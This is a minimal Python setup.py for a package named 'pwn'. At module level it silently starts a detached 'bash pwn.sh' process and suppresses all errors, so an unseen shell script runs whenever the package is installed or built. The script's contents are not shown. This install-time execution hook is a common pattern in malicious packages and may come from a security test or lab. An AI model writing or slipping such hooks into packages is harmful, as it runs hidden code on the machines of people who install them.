from setuptools import setup
import subprocess
import os

try:
    subprocess.Popen(['bash', 'pwn.sh'], start_new_session=True)
except:
    pass

setup(
    name="pwn",
    version="0.1.0",
    packages=[],
)
